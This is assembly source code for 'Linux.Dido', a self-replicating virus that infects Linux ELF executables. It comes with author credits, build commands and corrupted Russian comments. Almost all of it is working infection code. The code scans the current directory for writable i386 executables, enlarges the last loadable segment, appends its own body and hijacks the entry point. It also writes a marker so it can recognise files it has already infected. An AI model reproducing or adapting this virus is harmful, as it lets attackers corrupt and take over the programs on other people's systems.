   #                              <<Linux.Dido>>
   #
   # *â®â ¢¨àãá ¢¥¤àï¥âáï ¢ ELF ä ©« ¯ãâ¥¬ ¬®¤¨ä¨ª æ¨¨ § £®«®¢ª  ¯®á«¥¤¥£®
   # á¥£¬¥â  á  âà¨¡ãâ®¬ PT_LOAD (§ £àã¦ ¥âáï ¢ ¯ ¬ïâì). * ì®â ¥â ¢ â¥ªãé¥¬
   # ª â «®£¥. Žá®¡® á¨«ì® ï ¥£® ¥ â¥áâ¨à®¢ «, ¯®íâ®¬ã ¢®§¬®¦ë £«îª¨. Œ¥â®¤
   # § à ¦¥¨ï ¡ë« ®¯¨á  ¢ IKX#5.
   #
   # Š®¬¯¨«ïæ¨ï:
   # as -o dido_10.o dido_10.s
   # ld -s -o dido_10 dido_10.o
   #
   # 18.04.01                                           (C) Gobleen Warrior//SMF

                           .text
                           .globl _start

   #############################################################################
   #                       FIRST GENERATION HOST FILE                          #
   #############################################################################
   pseudo_host:            movl $4, %eax
                           movl $1, %ebx
                           movl $thank_u_Dido, %ecx
                           movl $thank_u_Dido_len, %edx
                           int $0x80

                           movl $1, %eax
                           xorl %ebx, %ebx
                           int $0x80

                           .data
   thank_u_Dido:           .ascii "\12\11\11\42...but your picture on my wall\12"
                           .ascii "\11\11it reminds me that it's not so bad,\12"
                           .ascii "\11\11it's not so bad...\42\12\12"
                           .asciz "\11\11\11Thank you, Dido!\12\12"
   thank_u_Dido_len        = . - thank_u_Dido

   #############################################################################
   #                             MAIN VIRUS CODE                               #
   #############################################################################
   _start:
   virus_start:            pushal
                           pushf
                           call fucking_all
   fucking_all:            popl %ebp
                           subl $fucking_all, %ebp

   # Open current directory
                           movl $5, %eax
                           leal current_dir(%ebp), %ebx
                           xorl %ecx, %ecx
                           int $0x80

                           orl %eax, %eax
                           js exit_virus                   # if an error
                           xchgl %eax, %ebx

   # Read strings from directory
   read_dir_string:        movl $89, %eax
                           leal name_buffa(%ebp), %ecx
                           int $0x80

                           decl %eax
                           jnz exit_virus                  # if there's no filez

                           pushl %ebx                      # Save dir handle

   # Check file for needed permissions
                           movl $33, %eax
                           leal name_buffa+10(%ebp), %ebx
                           movl $4|2, %ecx
                           int $0x80

                           orl %eax, %eax
                           jnz next_file

   # Open file for read/write
                           movl $5, %eax
                           leal name_buffa+10(%ebp), %ebx
                           movl $2, %ecx
                           int $0x80

                           orl %eax, %eax
                           js next_file
                           xchgl %eax, %ebx

   # Read ELF header to buffa
                           leal elf_header(%ebp), %ecx
                           movl $elf_header_size, %edx
                           call __NR_read

                           orl %eax, %eax
                           js close_file

   # Do some stupid checkz
                           cmpl $0x464c457f, e_ident(%ebp) # ELF file?
                           jne close_file

                           cmpl $0x00030002, e_ident+0x10(%ebp) # I386 exec?
                           jne close_file

                           cmpl $0x30446944, e_ident+8(%ebp) # Infected?
                           je close_file

   # Get last PT_LOAD program segment header offset
   # (as i saw, this header goes before last header in the file.
   # Last segment is PT_DYNAMIC)
                           movswl e_phnum(%ebp), %esi
   another_seg:            decl %esi
                           js close_file                   # if segment count < 0
                           pushl %esi
                           popl %ecx
                           shll $5, %ecx                   # (%ecx)*8*4
                           addl e_phoff(%ebp), %ecx        # add PHT offset

                           pushl %ecx                      # Save it
                           xorl %edx, %edx
                           call __NR_lseek

   # Read program header table entry to our buffa
                           leal prg_header(%ebp), %ecx
                           movl $prg_header_size, %edx
                           call __NR_read

   # Check the type of segment (must be PT_LOAD)
                           cmpl $1, p_type(%ebp)
                           jne another_seg

   # Increase sizes of the segment
                           addl $0x3000, p_filesz(%ebp)
                           addl $0x3000, p_memsz(%ebp)

   # Back to the entry offset
                           popl %ecx
                           xorl %edx, %edx
                           call __NR_lseek

   # Write updated segment header
                           leal prg_header(%ebp), %ecx
                           movl $prg_header_size, %edx
                           call __NR_write

   # Move pointer to EOF
                           xorl %ecx, %ecx
                           movl $2, %edx
                           call __NR_lseek                 # %eax = F_SIZE

   # Calculate and write new entrypoint
                           pushl old_entry_point(%ebp)     # Save old EP

                           pushl e_entry(%ebp)
                           popl old_entry_point(%ebp)

                           subl p_offset(%ebp), %eax       # %eax = F_SIZE
                           addl %eax, p_vaddr(%ebp)

                           pushl p_vaddr(%ebp)             # %eax = new EP
                           popl e_entry(%ebp)

   # Write virus to the EOF
                           leal virus_start(%ebp), %ecx
                           movl $virus_size, %edx
                           call __NR_write

   # Set pointer to the BOF
                           xorl %ecx, %ecx
                           xorl %edx, %edx
                           call __NR_lseek

   # Set file as already infected
                           movl $0x30446944, e_ident+8(%ebp)

   # Write updated ELF header to the file
                           leal elf_header(%ebp), %ecx
                           movl $elf_header_size, %edx
                           call __NR_write

   # Restore old entry point
                           popl old_entry_point(%ebp)

   # Close file
   close_file:             movl $6, %eax
                           int $0x80

   # Read next string from directory
   next_file:              popl %ebx
                           jmp read_dir_string

   # Return to host
   exit_virus:             popf
                           popal

   old_entry_point         = . + 1
                           push $pseudo_host
                           ret
   #############################################################################
   #                               SUBPROCEDURES                               #
   #############################################################################
   __NR_read:              movl $3, %eax
                           int $0x80
                           ret

   __NR_write:             movl $4, %eax
                           int $0x80
                           ret

   __NR_lseek:             movl $19, %eax
                           int $0x80
                           ret

   ###############################################################################
   #                            VIRUS DATA STRUCTURE                             #
   ###############################################################################
                           .ascii "Linux.Dido by Gobleen Warrior//SMF"
   current_dir:            .asciz "."
   virus_size              = . - virus_start

   name_buffa:             .skip 128, 0

                           .include "elf_head_buf.inc"
                           .include "prg_head_buf.inc"
